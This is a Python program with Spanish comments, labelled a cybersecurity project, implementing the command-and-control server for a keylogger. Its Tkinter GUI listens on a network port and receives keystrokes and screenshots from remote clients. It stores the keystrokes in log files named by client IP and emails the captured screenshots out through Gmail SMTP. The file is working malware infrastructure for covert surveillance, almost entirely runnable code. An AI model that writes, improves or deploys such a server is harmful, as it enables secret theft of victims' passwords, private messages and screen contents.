#!/usr/bin/env python3
"""
=============================================================
  SERVIDOR KEYLOGGER CON GUI - Proyecto de Ciberseguridad
=============================================================
"""

import socket
import threading
import os
import json
import smtplib
import tkinter as tk
from tkinter import scrolledtext, messagebox
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# ── Configuración ──────────────────────────────────────────
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 9999
LOG_DIR = "logs"
SCREENSHOT_DIR = "screenshots"

# ── Correo (se lee desde archivo .env) ─────────────────────
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

def load_env(filepath=".env"):
    """Lee variables de entorno desde un archivo .env"""
    env = {}
    try:
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, value = line.split("=", 1)
                    env[key.strip()] = value.strip()
    except FileNotFoundError:
        print("[!] Archivo .env no encontrado. Crea uno con las credenciales.")
    return env

_env = load_env()
EMAIL_USER = _env.get("EMAIL_USER", "")
EMAIL_PASS = _env.get("EMAIL_PASS", "")
EMAIL_TO = _env.get("EMAIL_TO", "")


class ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🔐 Servidor Keylogger - Ciberseguridad")
        self.root.geometry("820x620")
        self.root.configure(bg="#1a1a2e")
        self.root.resizable(True, True)

        self.server_socket = None
        self.running = False
        self.email_enabled = True
        self.clients_count = 0

        self.setup_directories()
        self.build_gui()

    def setup_directories(self):
        os.makedirs(LOG_DIR, exist_ok=True)
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    # ── Interfaz Gráfica ───────────────────────────────────

    def build_gui(self):
        # Estilo de colores
        bg = "#1a1a2e"
        fg = "#e0e0e0"
        accent = "#0f3460"
        btn_color = "#e94560"
        entry_bg = "#16213e"

        # ── Header ─────────────────────────────────────────
        header = tk.Frame(self.root, bg=accent, pady=10)
        header.pack(fill=tk.X)

        tk.Label(
            header, text="🔐 SERVIDOR KEYLOGGER",
            font=("Helvetica", 18, "bold"), bg=accent, fg="white"
        ).pack()

        # ── Configuración ──────────────────────────────────
        config_frame = tk.LabelFrame(
            self.root, text=" ⚙ Configuración ",
            font=("Helvetica", 11, "bold"),
            bg=bg, fg=fg, padx=10, pady=8
        )
        config_frame.pack(fill=tk.X, padx=10, pady=(10, 5))

        # Fila 1: Host y Puerto
        row1 = tk.Frame(config_frame, bg=bg)
        row1.pack(fill=tk.X, pady=2)

        tk.Label(row1, text="Host:", bg=bg, fg=fg, font=("Helvetica", 10)).pack(side=tk.LEFT)
        self.host_entry = tk.Entry(row1, width=15, bg=entry_bg, fg=fg,
                                   insertbackground=fg, font=("Courier", 10))
        self.host_entry.insert(0, DEFAULT_HOST)
        self.host_entry.pack(side=tk.LEFT, padx=(5, 20))

        tk.Label(row1, text="Puerto:", bg=bg, fg=fg, font=("Helvetica", 10)).pack(side=tk.LEFT)
        self.port_entry = tk.Entry(row1, width=8, bg=entry_bg, fg=fg,
                                   insertbackground=fg, font=("Courier", 10))
        self.port_entry.insert(0, str(DEFAULT_PORT))
        self.port_entry.pack(side=tk.LEFT, padx=5)

        # IP local
        local_ip = self.get_local_ip()
        tk.Label(
            row1, text=f"  📡 Tu IP: {local_ip}",
            bg=bg, fg="#00d2ff", font=("Courier", 10, "bold")
        ).pack(side=tk.LEFT, padx=20)

        # Fila 2: Email
        row2 = tk.Frame(config_frame, bg=bg)
        row2.pack(fill=tk.X, pady=2)

        self.email_var = tk.BooleanVar(value=True)
        tk.Checkbutton(
            row2, text="Enviar screenshots por email",
            variable=self.email_var, bg=bg, fg=fg,
            selectcolor=entry_bg, font=("Helvetica", 10),
            activebackground=bg, activeforeground=fg
        ).pack(side=tk.LEFT)

        tk.Label(
            row2, text=f"  {EMAIL_USER} → {EMAIL_TO}",
            bg=bg, fg="#aaa", font=("Helvetica", 9)
        ).pack(side=tk.LEFT, padx=10)

        # ── Botones ────────────────────────────────────────
        btn_frame = tk.Frame(self.root, bg=bg)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        self.start_btn = tk.Button(
            btn_frame, text="▶ INICIAR SERVIDOR",
            font=("Helvetica", 12, "bold"),
            bg="#28a745", fg="white", activebackground="#218838",
            cursor="hand2", padx=20, pady=5,
            command=self.start_server
        )
        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))

        self.stop_btn = tk.Button(
            btn_frame, text="⏹ DETENER",
            font=("Helvetica", 12, "bold"),
            bg=btn_color, fg="white", activebackground="#c82333",
            cursor="hand2", padx=20, pady=5,
            state=tk.DISABLED,
            command=self.stop_server
        )
        self.stop_btn.pack(side=tk.LEFT)

        # Status
        self.status_label = tk.Label(
            btn_frame, text="● Detenido",
            font=("Helvetica", 11), bg=bg, fg="#ff6b6b"
        )
        self.status_label.pack(side=tk.RIGHT, padx=10)

        # Clientes conectados
        self.clients_label = tk.Label(
            btn_frame, text="Clientes: 0",
            font=("Helvetica", 10), bg=bg, fg="#aaa"
        )
        self.clients_label.pack(side=tk.RIGHT, padx=10)

        # ── Log en tiempo real ─────────────────────────────
        log_label = tk.Label(
            self.root, text="📋 Registro de actividad:",
            font=("Helvetica", 11, "bold"), bg=bg, fg=fg, anchor="w"
        )
        log_label.pack(fill=tk.X, padx=10, pady=(10, 2))

        self.log_text = scrolledtext.ScrolledText(
            self.root, width=90, height=20,
            bg="#0d1117", fg="#58a6ff",
            insertbackground=fg, font=("Courier", 10),
            state=tk.DISABLED, wrap=tk.WORD
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))

        # Tags para colores
        self.log_text.tag_config("info", foreground="#58a6ff")
        self.log_text.tag_config("success", foreground="#3fb950")
        self.log_text.tag_config("warning", foreground="#d29922")
        self.log_text.tag_config("error", foreground="#f85149")
        self.log_text.tag_config("key", foreground="#bc8cff")
        self.log_text.tag_config("screenshot", foreground="#79c0ff")
        self.log_text.tag_config("email", foreground="#56d364")

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "No disponible"

    # ── Logging ────────────────────────────────────────────

    def log(self, message, tag="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        self.root.after(0, self._append_log, f"[{ts}] {message}\n", tag)

    def _append_log(self, text, tag):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, text, tag)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    # ── Servidor ───────────────────────────────────────────

    def start_server(self):
        host = self.host_entry.get().strip()
        try:
            port = int(self.port_entry.get().strip())
        except ValueError:
            messagebox.showerror("Error", "Puerto inválido")
            return

        self.email_enabled = self.email_var.get()
        self.running = True

        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.host_entry.config(state=tk.DISABLED)
        self.port_entry.config(state=tk.DISABLED)
        self.status_label.config(text="● Activo", fg="#3fb950")

        threading.Thread(
            target=self._run_server, args=(host, port), daemon=True
        ).start()

    def _run_server(self, host, port):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)

            self.log(f"Servidor iniciado en {host}:{port}", "success")
            self.log(f"Email: {'Activado' if self.email_enabled else 'Desactivado'}", "info")
            self.log("Esperando conexiones...", "info")

            while self.running:
                try:
                    conn, addr = self.server_socket.accept()
                    self.clients_count += 1
                    self.root.after(0, self.clients_label.config,
                                    {"text": f"Clientes: {self.clients_count}"})
                    threading.Thread(
                        target=self.handle_client,
                        args=(conn, addr), daemon=True
                    ).start()
                except socket.timeout:
                    continue

        except Exception as e:
            self.log(f"Error del servidor: {e}", "error")
        finally:
            if self.server_socket:
                self.server_socket.close()

    def stop_server(self):
        self.running = False
        self.log("Servidor detenido por el usuario.", "warning")

        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.host_entry.config(state=tk.NORMAL)
        self.port_entry.config(state=tk.NORMAL)
        self.status_label.config(text="● Detenido", fg="#ff6b6b")
        self.clients_count = 0
        self.root.after(0, self.clients_label.config, {"text": "Clientes: 0"})

    # ── Manejo de clientes ─────────────────────────────────

    def handle_client(self, conn, addr):
        client_ip = addr[0]
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_filename = os.path.join(LOG_DIR, f"keylog_{client_ip}_{timestamp}.txt")

        self.log(f"✅ Cliente conectado: {client_ip}:{addr[1]}", "success")

        buffer = b""

        try:
            with open(log_filename, "a", encoding="utf-8") as log_file:
                log_file.write(f"=== Sesión iniciada: {timestamp} ===\n")
                log_file.write(f"=== Cliente: {client_ip} ===\n\n")

                while self.running:
                    # Leer header
                    while b"\n" not in buffer:
                        chunk = conn.recv(4096)
                        if not chunk:
                            raise ConnectionError("Desconectado")
                        buffer += chunk

                    header_line, buffer = buffer.split(b"\n", 1)

                    try:
                        header = json.loads(header_line.decode("utf-8"))
                    except json.JSONDecodeError:
                        continue

                    msg_type = header.get("type", "")
                    payload_size = header.get("size", 0)

                    # Leer payload
                    while len(buffer) < payload_size:
                        chunk = conn.recv(4096)
                        if not chunk:
                            raise ConnectionError("Desconectado")
                        buffer += chunk

                    payload = buffer[:payload_size]
                    buffer = buffer[payload_size:]

                    if msg_type == "keys":
                        keys_text = payload.decode("utf-8", errors="replace")
                        ts = datetime.now().strftime("%H:%M:%S")
                        log_file.write(f"[{ts}] {keys_text}\n")
                        log_file.flush()
                        # Mostrar resumen en GUI
                        display = keys_text.replace("\n", "↵")
                        if len(display) > 60:
                            display = display[:60] + "..."
                        self.log(f"⌨ [{client_ip}] {display}", "key")

                    elif msg_type == "screenshot":
                        ss_filename = header.get(
                            "filename",
                            f"ss_{client_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                        )
                        ss_path = os.path.join(SCREENSHOT_DIR, ss_filename)

                        with open(ss_path, "wb") as ss_file:
                            ss_file.write(payload)

                        size_kb = len(payload) / 1024
                        self.log(f"📷 Screenshot: {ss_filename} ({size_kb:.1f} KB)", "screenshot")

                        if self.email_enabled:
                            threading.Thread(
                                target=self.send_email,
                                args=(ss_path,), daemon=True
                            ).start()

                log_file.write(
                    f"\n=== Sesión finalizada: "
                    f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
                )

        except ConnectionError:
            self.log(f"❌ Cliente desconectado: {client_ip}", "warning")
        except Exception as e:
            self.log(f"Error con {client_ip}: {e}", "error")
        finally:
            conn.close()
            self.clients_count = max(0, self.clients_count - 1)
            self.root.after(0, self.clients_label.config,
                            {"text": f"Clientes: {self.clients_count}"})

    # ── Email ──────────────────────────────────────────────

    def send_email(self, filepath):
        try:
            msg = MIMEMultipart()
            msg["From"] = EMAIL_USER
            msg["To"] = EMAIL_TO
            msg["Subject"] = "📷 Captura de Pantalla - Keylogger"

            body = (
                f"Captura recibida del cliente.\n"
                f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Archivo: {os.path.basename(filepath)}"
            )
            msg.attach(MIMEText(body, "plain"))

            with open(filepath, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(filepath)}"
                )
                msg.attach(part)

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(EMAIL_USER, EMAIL_PASS)
                server.sendmail(EMAIL_USER, EMAIL_TO, msg.as_string())

            self.log(f"✉ Email enviado: {os.path.basename(filepath)}", "email")

        except Exception as e:
            self.log(f"Error de email: {e}", "error")


def main():
    root = tk.Tk()
    app = ServerGUI(root)
    root.protocol("WM_DELETE_WINDOW", lambda: (app.stop_server(), root.destroy()))
    root.mainloop()


if __name__ == "__main__":
    main()
